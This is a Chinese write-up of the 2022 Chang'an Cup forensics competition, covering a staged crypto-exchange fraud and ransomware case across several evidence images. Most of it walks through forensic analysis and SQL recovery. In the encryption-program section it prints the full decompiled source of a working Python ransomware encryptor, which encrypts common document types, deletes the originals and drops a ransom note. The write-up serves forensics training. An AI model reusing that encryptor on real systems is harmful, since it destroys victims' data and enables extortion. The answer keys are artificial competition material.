# 2022长安杯wp

案件背景某地警方接到受害人报案称其在某虚拟币交易网站遭遇诈骗，该网站号称使用”USTD币“购买所谓的"HT币”，受害人充值后不但“HT币”无法提现、交易，而且手机还被恶意软件锁定勒索。警方根据受害人提供的虚拟币交易网站调取了对应的服务器镜像并对案件展开侦查。
>VC容器密码为：2022.4th.changancup!
>链接： https://pan.baidu.com/s/1f9xzt0jooZ-RZylwtt3YvQ
提取码： 1234
SHA256:37263f0aace3e33e7f303473e85e69ef804eb16a2500b68a
6b90c895784666f5

![输入图片说明](/imgs/2022-11-06/C8oBegwhiVdnCBzm.png)



## 检材一：1-10
根据报案人提供的网站域名和IP，警方调取了对应的服务器镜像“检材1”，分析掌握的检材回答下列问题
>1	检材1的SHA256值为
2	分析检材1，搭建该服务器的技术员IP地址是多少？用该地址解压检材2
3	检材1中，操作系统发行版本号为
4	检材1系统中，网卡绑定的静态IP地址为
5	检材1中，网站jar包所存放的目录是
6	检材1中，监听7000端口的进程对应文件名为
7	检材1中，网站管理后台页面对应的网络端口为
8	检材1中，网站前台页面里给出的APK的下载地址是
9	检材1中，网站管理后台页面调用的用户表(admin)里的密码字段加密方式为?
10	分析检材1，网站管理后台登录密码加密算法中所使用的盐值是


>1	检材1的SHA256值为
>因为是赛后复盘，弘连的软件过期了，用的是美亚的取证大师进行操作。挂载完以后，右键即算哈希，得到结果
>**9E48BB2CAE5C1D93BAF572E3646D2ECD26080B70413DC7DC4131F88289F49E34**
>![输入图片说明](/imgs/2022-11-06/E91mmidFXUwIQonu.png)

>2	分析检材1，搭建该服务器的技术员IP地址是多少？用该地址解压检材2
>用仿真软件仿真检材一，通过last命令查看
>得到答案**172.16.80.100**
>![输入图片说明](/imgs/2022-11-09/8Q5M64f9rygpp4DF.png)

>3	检材1中，操作系统发行版本号为
>在火眼创建虚拟机的时候可以看到**7.5.1804**
>![输入图片说明](/imgs/2022-11-09/kXS2RcZWKMmVuIcK.png)


>4	检材1系统中，网卡绑定的静态IP地址为
>找配置文件/etc/sysconfig/network-scripts/ifcfg-en33
>**172.16.80.133**![输入图片说明](/imgs/2022-11-09/nhcYuzy9eZkW3EmB.png)
>

>5	检材1中，网站jar包所存放的目录是
>直接history一下，因为该虚拟机不支持鼠标滚轮滑动，所以在history后面价格管道符再加上more，就可以支持回车查看了命令：history | more
>很明显，在**/web/app**下
>![输入图片说明](/imgs/2022-11-09/w3KVihNtWcBOBDsK.png)

后面的就需要启动服务器进行检查了，不会搭建服务器的同学也不要担心，九百多行命令大致看一下，只需要学会怎么启动就可以了。
在第953行有一个 sh start_web.sh的脚本启动，但是后面可以看到有个人吧这个脚本删掉了，所以只能手动启动。（这其实是一个坑，这个启动文件会在后面的检材里发现）
>6	检材1中，监听7000端口的进程对应文件名为
>注意.jar后缀的包都是后端代码，.js是前端代码，所以过滤一下历史命令，发现166-171是所有jar包的启动路径和方式，两种思路

>![输入图片说明](/imgs/2022-11-09/j2CjpoGg00qfHvg4.png)
>>第一种：挨个启动启动后观看7000端口（其实启动时候仔细看已经有答案了）![输入图片说明](/imgs/2022-11-09/mJxfj0DsqMnS5Pbl.png)
>>第二种：文件导出来看源码，导出来以后不能直接打开，需要有反编译软件如
>![输入图片说明](/imgs/2022-11-09/EvOmVRVvn0vdFFHk.png)
>然后把文件拖进去然后看源码就会发现答案
>![输入图片说明](/imgs/2022-11-09/YmfSJz86SG5hmc3v.png)


7,8题建议从检材二里面找到启动脚本然后在做，不然看历史命令太太太麻烦了。9,10为源码分析，把admin-api.jar包导出来看源码。

7	检材1中，网站管理后台页面对应的网络端口为
8	检材1中，网站前台页面里给出的APK的下载地址是
>9	检材1中，网站管理后台页面调用的用户表(admin)里的密码字段加密方式为?
10	分析检材1，网站管理后台登录密码加密算法中所使用的盐值是
>随意一看源码9题答案是**MD5**
>10题是**XehGyeyrVgOV4P8Uf70REVpIw3iVNwNs**
>![输入图片说明](/imgs/2022-11-09/V11n33a12JOO59qR.png)
>仔细一看这个java包里面给的信息真不少
>这里有一个数据库的密码账号，还有一个IP是128，猜测是数据库服务器![输入图片说明](/imgs/2022-11-09/cbgvecwI985d6aCh.png)
>这里还有mongodb和redis数据库![输入图片说明](/imgs/2022-11-09/e4aLmZ5k7I9tQv2Q.png)

## 检材二：11-19
>11	检材2中，windows账户Web King的登录密码是
>仿真一下**135790**
>![输入图片说明](/imgs/2022-11-09/rNZaXeEM8RDK5J0E.png)

>12	检材2中，除检材1以外，还远程连接过哪个IP地址？并用该地址解压检材3
>里面有链接172.16.80.128的记录
>![输入图片说明](/imgs/2022-11-09/e3dnqhuQuGAqzVsw.png)

>13	检材2中，powershell中输入的最后一条命令是
>当时比赛时候找了好久，还尝试了在虚拟机里面调用命令，但是没搞出来，命令文件在下图路径中文件里，所以答案是**ipconfig**
>其实仿真出来直接摁键盘上上下左右的上键历史记录就出来了，当时还真没想到
>![输入图片说明](/imgs/2022-11-09/C05oSQy2kOOw1M6N.png)
![输入图片说明](/imgs/2022-11-09/o5EkRxP8KOmS2TXD.png)



>14	检材2中，下载的涉案网站源代码文件名为
>在压缩文件里翻找一下（还好不多），找一下可疑的文件然后导出来看一下，或者到浏览器下载记录里面看。
>![输入图片说明](/imgs/2022-11-09/EJiWDPupZyjA76YU.png)
>![输入图片说明](/imgs/2022-11-09/vzGKOv9ttJn8v5bC.png)
>这个jar的五个文件就是检材一网站搭建里面的jar包
>答案为：**ZTuoExchange_framework-master.zip**


>15	检材2中，网站管理后台root账号的密码为
>这个取证大师没有找到，应该必须到弘连里面找，但是我的弘连出了点问题，应该在弘连的浏览器分析里面一下就能找到，答案是**root**


>16	检材2中，技术员使用的WSL子系统发行版本是
>不知道WSL是啥，搜一下
>![输入图片说明](/imgs/2022-11-09/ju09cmQmiN7zQM75.png)
>搜一下一看**20.04**
![输入图片说明](/imgs/2022-11-09/5mE2r2xu0OdH3jbL.png)



>17	检材2中，运行的数据库服务版本号是
>直接win+R输入bash进入WSL子系统，然后猜一下可能是MySQL，直接mysql -V查一下，果然有，**8.0.30**
>或者进入到root命令里，上下左右键的上，可以看到历史命令记录，里面有MySQL，
>![输入图片说明](/imgs/2022-11-09/NTnDFtNfQYXdHVN7.png)

>18	上述数据库debian-sys-maint用户的初始密码是
>这个不太会，网上搜一下，直接查看这个文件，果然就有密码**ZdQfi7vaXjHZs75M**
>![输入图片说明](/imgs/2022-11-09/n81RYu9Vr6DuVemz.png)![输入图片说明](/imgs/2022-11-09/Kcw6nyfj95WvlWd6.png)

>19	检材3服务器root账号的密码是
>大家是否还记得在ssh链接记录里面有一个密码记录**h123456**![输入图片说明](/imgs/2022-11-09/GhkBbv35c9MGTUC1.png)



## 检材三 20-32

>20	检材3中，监听33050端口的程序名（program name）为
21	除MySQL外，该网站还依赖以下哪种数据库
22	检材3中，MySQL数据库root账号的密码是
23	检材3中，MySQL数据库在容器内部的数据目录为
24	涉案网站调用的MySQL数据库名为
25	勒索者在数据库中修改了多少个用户的手机号？
26	勒索者在数据库中删除的用户数量为
27	还原被破坏的数据库，分析除技术员以外，还有哪个IP地址登录过管理后台网站？用该地址解压
检材4
28	还原全部被删改数据，用户id为500的注册会员的HT币钱包地址为
29	还原全部被删改数据，共有多少名用户的会员等级为'LV3'
30	还原全部被删改数据，哪些用户ID没有充值记录
31	还原全部被删改数据，2022年10月17日总计产生多少笔交易记录？
32	还原全部被删改数据，该网站中充值的USDT总额为

在分析以后发现有docker服务器，查看命令分析一波
![输入图片说明](/imgs/2022-11-09/DdqqprBwJxqsTEeF.png)
![输入图片说明](/imgs/2022-11-09/c1M7T5qiDwQKkay6.png)
查看有关docker的命令：history | grep docker | more
发现有一个docker-compose.yml文件，这个是docker的一个类似配置文件的东西

>20	检材3中，监听33050端口的程序名（program name）为
>猜测是docker，先启动一下，systemctl start docker，然后果然是docker， **docker-proxy**
![输入图片说明](/imgs/2022-11-09/iVl73UPo4aYKL8q5.png)


>21	除MySQL外，该网站还依赖以下哪种数据库
>回到检材一的9,10题的逆向代码部分，**redis.mongo**

>22	检材3中，MySQL数据库root账号的密码是
>回到检材一的9,10题的逆向代码部分, **shhl7001**

>23	检材3中，MySQL数据库在容器内部的数据目录为
>根据历史记录，docker-compose应该在/data/mysql里面。**/var/lib/mysql**。注其中vlumes前面是宿主机的目录，后面是容器里的目录
>![输入图片说明](/imgs/2022-11-09/qwkInZzHI8yQliJN.png)
>![输入图片说明](/imgs/2022-11-09/IytomRezD2qK4Fz2.png)

>24	涉案网站调用的MySQL数据库名为
>需要我们启动docker，进入到容器里面，先启动docker：systemctl start docker，然后docker images查看容器，然后docker run cc开启容器，然后docker exec -it 8e bash 进入到容器里。发现数据库只有几个初始数据库？？？（其实是被删掉了）
>![输入图片说明](/imgs/2022-11-09/kiAlk877wwi25vsv.png)
>其实真正的数据库被放在了检材二的E盘里
>![输入图片说明](/imgs/2022-11-09/pbLDC9cSdO2KCkIk.png)
>无意间还发现了被删掉的start_web.sh
>![输入图片说明](/imgs/2022-11-09/m9f4vpspVpTnqUam.png)
>还有两个奇怪的文件后面也有用处
>![输入图片说明](/imgs/2022-11-09/0EbPXLXDkdgRa1Vp.png)

### 如何让xshell链接到虚拟机
为什么要链接？因为我们后面需要吧文件传入到检材一和检材三里面启动网站并恢复数据库文件，文件传输我们需要先用xshell连接到虚拟机，然后用xftp进行文件的传输，在连接前，我们需要配置一下虚拟机的设置。
我们先看下几个虚拟机的的网段是172.16.80.X。这个是B类子网IP172.16.X.X。C类子网我们比较熟悉了，是192.168.X.X。所以我们要更改一下虚拟机配置，
第一步点击虚拟机的编辑里面的虚拟网络编辑器，
![输入图片说明](/imgs/2022-11-10/GvGjJrNnKnrr17WL.png)
第二步点击更改设置
![输入图片说明](/imgs/2022-11-10/92RCeCODaxzzlL0l.png)
第三步点击VMnet8，然后如下图配置，其中DHCP配置如下，然后点击确定
![输入图片说明](/imgs/2022-11-10/spyA6BrVyndeJGWK.png)
![输入图片说明](/imgs/2022-11-10/vUSiC2E5BgdBwTTn.png)
第四步配置虚拟机的Vmnet8网段然后启动
![输入图片说明](/imgs/2022-11-10/3wCfFmK7rXs2LIIc.png)
第五步打开xshell，以检材三为例，只需要填写主机172.16.80.128还有名字随便填，然后连接就可以了，然后会出现一个链接提示，输入root和123456密码就可以连上了
![输入图片说明](/imgs/2022-11-10/m4HatyB4qthLbFnf.png)
这就是连上了
![输入图片说明](/imgs/2022-11-10/6kIKRthufIu3H0AF.png)
然后点击这个绿色的按钮就好了（别忘了下载xftp）
![输入图片说明](/imgs/2022-11-10/JbESA7Ohzm3FiKfy.png)


>25	勒索者在数据库中修改了多少个用户的手机号？
>在检材三的/data/mysql/db目录下有一个.log的日志文件,弘连或者取证大师都能拿到导出来看一下
>![输入图片说明](/imgs/2022-11-10/aEmFbJpdYxXVK0Xi.png)
>在这里有一个member表，有大量的数据填入，往上一拉看一下是哪个数据库，果然是b1
![输入图片说明](/imgs/2022-11-10/kMzmlIrAIeFCEXgn.png)
>mysql里面修改数据是update，搜索一下关键字，发现有八个匹配，但是要注意，其中5个登录时候自动修改时间的语句，真正修改的只有**3**个。


>26	勒索者在数据库中删除的用户数量为
>搜索delete，发现有批量删除数据，随便数一下**28**个
>![输入图片说明](/imgs/2022-11-10/k8FjJKyqEawYo14e.png)


### 数据库恢复并链接
>27	还原被破坏的数据库，分析除技术员以外，还有哪个IP地址登录过管理后台网站？用该地址解压
检材4
>查看b1数据库两种方法，一种是恢复原数据库，另一种是用脚本恢复
>第一种：恢复原数据库
>上面的xshell操作已经还原的被删除的数据库，因为docker里的数据库被映射到主机的/data/mysql/db里面，所以把b1直接拖进去就行
>![输入图片说明](/imgs/2022-11-10/IE1xAoewsfD8sTHF.png)
>然后我们docker ps一下，发现docker中MySQL的端口映射到了主机33050
>![输入图片说明](/imgs/2022-11-10/4n3UueRt8oXq9Mvw.png)
>打开数据库编辑软件，我用的是Navicat，然后填写设置，别忘了密码是shhl7001，然后就链接上了（别忘了启动docker！！！）（如果还不行，手动更改一下b1的权限，chmod一下，）
>![输入图片说明](/imgs/2022-11-10/WACgv390MzO2bTup.png)
>这里有个admin的登录记录，看一下得到结果，**172.16.80.197**
>![输入图片说明](/imgs/2022-11-10/KwZrlNM5PE2lgYDU.png)
>方法二：利用脚本恢复
>百度搜索：mysql ibd文件恢复


>28	还原全部被删改数据，用户id为500的注册会员的HT币钱包地址为
>**cee631121c2ec9232f3a2f028ad5c89b**
>![输入图片说明](/imgs/2022-11-10/5icbpDhE6Uu56SLX.png)


>29	还原全部被删改数据，共有多少名用户的会员等级为'LV3'
>发现等级三对应的编号就是3，查询一下
>![输入图片说明](/imgs/2022-11-10/TbeOjyGrxSkFfek0.png)
>直接查询一下，发现答案是158，发现答案是**164**，突然想起来还有被删除的28人！！！，里面有6个3等级。
>![输入图片说明](/imgs/2022-11-10/U4MwNfpewdEyK5iz.png)

>30	还原全部被删改数据，哪些用户ID没有充值记录
>简单查一下，需要用到聚合函数，SELECT * FROM member_wallet WHERE balance =0;
>**318,989**
>![输入图片说明](/imgs/2022-11-10/oLAQYBm9l1raBaTQ.png)


>31	还原全部被删改数据，2022年10月17日总计产生多少笔交易记录？
>这题需要用到模糊查询，SELECT count(*) FROM member_transaction WHERE create_time LIKE '2022-10-17%'
>![输入图片说明](/imgs/2022-11-10/heG38PVuUwOyI3Df.png)

>32	还原全部被删改数据，该网站中充值的USDT总额为
>SELECT SUM(balance) FROM member_wallet;浅浅算一下**40822800.00000000**
>![输入图片说明](/imgs/2022-11-10/vgm7p3zR9yfOd3SV.png)

或者不会数据库的同学可以启动网站然后查看，因为现在已经拿到了start_web.sh，开启网站比较容易，直接吧该文件放在/web/app目录下，然后sh start_web.sh启动即可，
![输入图片说明](/imgs/2022-11-10/E49okt7Vpb4It0ic.png)
看到starting：web：admin就是已经起好服务了,账号密码root，root
![输入图片说明](/imgs/2022-11-10/cZLwFery8S8AYms9.png)
因为数据库已经起起来了，所以这里面可以直接查到数据。
![输入图片说明](/imgs/2022-11-10/3vM2wbNjOrKrJdSv.png)
比赛的时候我还以为必须要重建数据库并且搭建好网站，但是我对网站服务器数据库什么的不是特别熟，再加上有些紧张，就没有想到其他方法去解题，用其他方法恢复也是可以的。


## 检材四
检材四独立于前面这些服务器啥的，所以不会前面的也没有关系。
![输入图片说明](/imgs/2022-11-10/LX4NQO11DmCF7MrG.png)建材四解压完是个npbk文件，不知道是个啥，搜一下
![输入图片说明](/imgs/2022-11-10/0d6LFRILFJC1QAVh.png)
应该是手机模拟器镜像，发现这个包还可以打开，（解压工具）
![输入图片说明](/imgs/2022-11-10/COkwfCEFiuNzrT2N.png)
里面有一个conf_temp.ini文件，vmdk就是虚拟镜像文件，正巧之前用过夜神模拟器，一看这个应该就是夜神了，下载夜神模拟器，看能不能打开这个![输入图片说明](/imgs/2022-11-10/keRyGKGlZHe348Pi.png)

下载夜神以后有一个模拟器助手，打开，导入npbk包
![输入图片说明](/imgs/2022-11-10/M3hQp0I2hQQe9je2.png)

>33	嫌疑人使用的安卓模拟器软件名称是	
34	检材4中，“老板”的阿里云账号是	
35	检材4中安装的VPN工具的软件名称是	
36	上述VPN工具中记录的节点IP是	
37	检材4中，录屏软件安装时间为	
38	上述录屏软件中名为“s_20221019105129”的录像，在模拟器存储中对应的原始文件名为
39	上述录屏软件登录的手机号是	
40	检材4中，发送勒索邮件的邮箱地址为	


>33	嫌疑人使用的安卓模拟器软件名称是	
>夜神模拟器

>34	检材4中，“老板”的阿里云账号是	
>看了一下浏览器记录没有阿里云的账号，也没app,应该是在聊天记录里。果然forensixtech1
>![输入图片说明](/imgs/2022-11-10/oH0Vsxkl2m8PxJYJ.png)

>35	检材4中安装的VPN工具的软件名称是	
>v2rayNG
>![输入图片说明](/imgs/2022-11-10/E1IDb8WUrmZl3T45.png)

>36	上述VPN工具中记录的节点IP是	
>38.68.135.18
>![输入图片说明](/imgs/2022-11-10/GZrLcUThmGIAtM56.png)


>37	检材4中，录屏软件安装时间为	
>可以看到模拟器里面有个软件叫录屏，但是解析里面没有，那就从包名入手，发现一个可疑的包，应该就是答案**2022/10/19 10:50:27**
>![输入图片说明](/imgs/2022-11-10/xNtny40eknmB0yfR.png)![输入图片说明](/imgs/2022-11-10/uyolGqJPyMhQ3GpF.png)


>38	上述录屏软件中名为“s_20221019105129”的录像，在模拟器存储中对应的原始文件名为
>在/data/com.jiadi.luping/databases/record.db里面有一串字符就是源文件**0c2f5dd4a9bc6f34873fb3c0ee9b762b98e8c46626410be7191b11710117a12d**
>![输入图片说明](/imgs/2022-11-10/MuEbzxBKRymDC6tM.png)


>39	上述录屏软件登录的手机号是	
>这个是sqlite数据库，没有用过，看复盘说要导出record.db和record.db-wal文件，后者是一个预写日志
>打开Navicat数据库文件打开
>![输入图片说明](/imgs/2022-11-10/Hx75CezeHwZudKoF.png)
>发现答案,**18645091802**
>![输入图片说明](/imgs/2022-11-10/eLqDSjLtSDuCanIH.png)


>40	检材4中，发送勒索邮件的邮箱地址为	
>一查就出来了**skterran@163.com**
>![输入图片说明](/imgs/2022-11-10/nEzY8RcCI0WMEDzd.png)


## 分析所有掌握的检材，找到勒索邮件中被加密的文档和对应的加/解密程序，并回答下列问题
>41	分析加密程序，编译该加密程序使用的语言是
42	分析加密程序，它会加密哪些扩展名的文件？
43	分析加密程序，是通过什么算法对文件进行加密的？
44	分析加密程序，其使用的非对称加密方式公钥后5位为？
45	被加密文档中，FLAG1的值是

之前在材料二里面的

首先是查壳，这个用IDEA只能查出来是C++编译，这里一个比较好用的工具是Die，下载链接如下https://www.ghxi.com/die.html，（其实一看就是python的编译），
![输入图片说明](/imgs/2022-11-11/NkH94uZbqMKjuBYG.png)
用查壳看一下，是pyinstaller
![输入图片说明](/imgs/2022-11-11/DrbA3J3RAIZKoAIw.png)
然后是解包，网上搜一下pyinstaller解包，然后根据步骤一步一步来，先下载pyinstxtractor，https://github.com/extremecoders-re/pyinstxtractor，然后到当前.exe文件打开cmd，然后输入python pyinstxtractor.py decrypt_file.exe，![输入图片说明](/imgs/2022-11-11/ZfmUyNHbFfBDslIH.png)
成功截图，然后会生成一个decrypt_file.exe_extracted的文件，文件里面有一个decrypt_file_1.pyc文件，我们需要把这个文件反编译。先,
```pip install uncompyle6```
然后cmd到decrypt_file_1.pyc目录下，输入
```uncompyle6 decrypt_file_1.pyc > demo.py```
![输入图片说明](/imgs/2022-11-11/NIGtYQcFCB6CaFfx.png)
成功反编译出源文件，另一个EXE文件同理
![输入图片说明](/imgs/2022-11-11/rnVGMlTQl9HELh58.png)
encrypt_file。py
```
# uncompyle6 version 3.8.0

# Python bytecode 3.6 (3379)

# Decompiled from: Python 3.7.13 (default, Mar 28 2022, 08:03:21) [MSC v.1916 64 bit (AMD64)]

# Embedded file name: encrypt_file_1.py

import time

from Crypto.PublicKey import RSA

from Crypto.Cipher import PKCS1_v1_5 as Cipher_pkcs1_v1_5

import os

pubkey = '-----BEGIN PUBLIC KEY-----\nMIIBIzANBgkqhkiG9w0BAQEFAAOCARAAMIIBCwKCAQEAx5JF4elVDBaakgGeDSxI\nCO1LyyZ6B2TgR4DNYiQoB1zAyWPDwektaCfnvNeHURBrw++HvbuNMoQNdOJNZZVo\nbHVZh+rCI4MwAh+EBFUeT8Dzja4ZlU9E7jufm69TQS0PSseIiU/4Byd2i9BvIbRn\nHLFZvi/VXphGeW0qVeHkQ3Ll6hJ2fUGhTsuGLc1XXHfiZ4RbJY/AMnjYPy9CaYzi\nSOT4PCf/O12Kuu9ZklsIAihRPl10SmM4IRnVhZYYpXedAyTcYCuUiI4c37F5GAhz\nRDFn9IQ6YQRjlLjuOX8WB6H4NbnKX/kd0GsQP3Zbogazj/z7OM0Y3rv3T8mtF6/I\nkwIEHoau+w==\n-----END PUBLIC KEY-----\n'

msg = "SOMETHING WENT WRONG,PLEASE CONTACT YOUR SYSTEM ADMINISTRATOR!\nHe can help you to understand whats happened.\nIf he can't help you,contact us via email:\naa1028@forensix.cn\nale@forensix.cn\nHURRY UP!WE HAVE ANTIDOTE FOR YOUR FILES!DISCOUNT 20%FOR CLIENTS,WHO CONTACT US IN THE SAME DAY!\nYou can attach 2 files (text or picture)to check our honest intentions,we will heal them and send\nback.\nPlease pay 0.618 ETH\nThe wallet address��0xef9edf6cdacb7d925aee0f9bd607b544c5758850\n************************************\n"

  

class XORCBC:

  

def __init__(self, key: bytes):

self.key = bytearray(key)

self.cur = 0

  

def encrypt(self, data: bytes) -> bytes:

data = bytearray(data)

for i in range(len(data)):

tmp = data[i]

data[i] ^= self.key[self.cur]

self.key[self.cur] = tmp

self.cur = (self.cur + 1) % len(self.key)

  

return bytes(data)

  
  

print('���ܳ���V1.0')

print('�ļ����ڼ�����~~~~~~~~~~~~~~~~~~\n')

  

def run_finall():

for filepath, dirnames, filenames in os.walk(os.getcwd()):

for filename in filenames:

if filename != 'encrypt_file.py' and filename != 'decrypt_file.py' and '_encrypted' not in filename:

ExtensionPath = os.path.splitext(filename)[(-1)]

if '.txt' == ExtensionPath or '.jpg' == ExtensionPath or '.xls' == ExtensionPath or '.docx' == ExtensionPath:

time.sleep(3)

data_file = os.path.join(filepath, filename)

rsakey = RSA.import_key(pubkey)

cipher = Cipher_pkcs1_v1_5.new(rsakey)

xor_key = os.urandom(16)

xor_obj = XORCBC(xor_key)

outf = open(data_file + '_encrypted', 'wb')

encrypted_xor_key = cipher.encrypt(xor_key)

outf.write(encrypted_xor_key)

buffer_size = 4096

with open(data_file, 'rb') as (f):

while True:

data = f.read(buffer_size)

if not data:

break

outf.write(xor_obj.encrypt(data))

  

outf.close()

os.remove(data_file)

  
  

run_finall()

  

def redme():

try:

dir = os.path.join(os.path.expanduser('~'), 'Desktop')

print(dir)

with open(dir + '/!READ_ME.txt', 'w') as (ff):

ff.write(msg)

except:

dir1 = os.getcwd()

print(dir1)

with open(dir1 + '/!READ_ME.txt', 'w') as (ff):

ff.write(msg)

  
  

print('\n�������~~~~~~~~~~~~~~~~~~')

os.system('pause')

# okay decompiling encrypt_file_1.pyc
```


>41	分析加密程序，编译该加密程序使用的语言是
>python

>42	分析加密程序，它会加密哪些扩展名的文件？
>.txt.jpg.xls.docx
>![输入图片说明](/imgs/2022-11-11/gukq0Mddq4zBtlw5.png)

>43	分析加密程序，是通过什么算法对文件进行加密的？
>真正加密的是XORCBC函数，再看一下是一个用**异或**加密的类
>![输入图片说明](/imgs/2022-11-11/zGHUGrzmNgsLuaKk.png)
>![输入图片说明](/imgs/2022-11-11/GSHHig8JOld0GDZS.png)

>44	分析加密程序，其使用的非对称加密方式公钥后5位为？
>**u+w==**

>45	被加密文档中，FLAG1的值是
>在解密代码中，发现秘钥，然后把加密文档拖进去，输入秘钥，得到结果**TREFWGFS**
>![输入图片说明](/imgs/2022-11-11/dpZGMMpWmnJ4qfYG.png)
>![输入图片说明](/imgs/2022-11-11/9Qxb57JS9QDMJWkZ.png)
>![输入图片说明](/imgs/2022-11-11/zoFoYNveWfdKElBe.png)


##  apk解析



>46	恶意APK程序的包名为
47	APK调用的权限包括
48	解锁第一关所使用的FLAG2值为
49	解锁第二关所使用的FLAG3值为
50	解锁第三关所需的KEY值由ASCII可显示字符组成，请请分析获取该KEY值

听说在检材二里面有APK，但是我没有找到，我是在网站页面的二维码里面下载的，启动服务器，主机登上172.16.80.133:3000（3000端口是用户，9090是管理后台），登上后台是这样子的
![输入图片说明](/imgs/2022-11-11/RLAfMrmCz4GgnZAK.png)
扫描二维码下载到apk然后放到火眼里分析


>46	恶意APK程序的包名为
>**cn.forensix.changancup**
>![输入图片说明](/imgs/2022-11-11/2NWp7asTGICmtiA7.png)

>47	APK调用的权限包括
>READ_EXTERNAL_STORAGE；WRITE_EXTERNAL_STORAGE；
>（这是个选择题）
>![输入图片说明](/imgs/2022-11-11/t7E5HmwFb3PGyns4.png)

>48	解锁第一关所使用的FLAG2值为
>
>49	解锁第二关所使用的FLAG3值为
>50	解锁第三关所需的KEY值由ASCII可显示字符组成，请请分析获取该KEY值

<!--stackedit_data:
eyJoaXN0b3J5IjpbNzU3OTI3MzY5LDg5Mzk2MTAyMywtMzgwOD
U1NDYwLDE1NjAxMDk5MzAsMTU1MjkxNzYzOCwxNzk1Mzg3ODg0
LC00MjUyMDQ0MTIsNzgxMDg0ODg2LC0xNzQwMDM5MzA3LDkwMD
YwODc0NSwtMTc1MDIwMjIxMywxOTgxNzgxMTYyLC0xMDQ5MTYz
ODEzLDE4NTU0MzEzMSwtMTAzNTMwODU2MywxMjkxMzkwNTU0LD
EzOTQ4OTY3NjEsMTIyOTY1OTAzNywtMTExMjY2MjAwNCwtMTky
ODk2OTg1Nl19
-->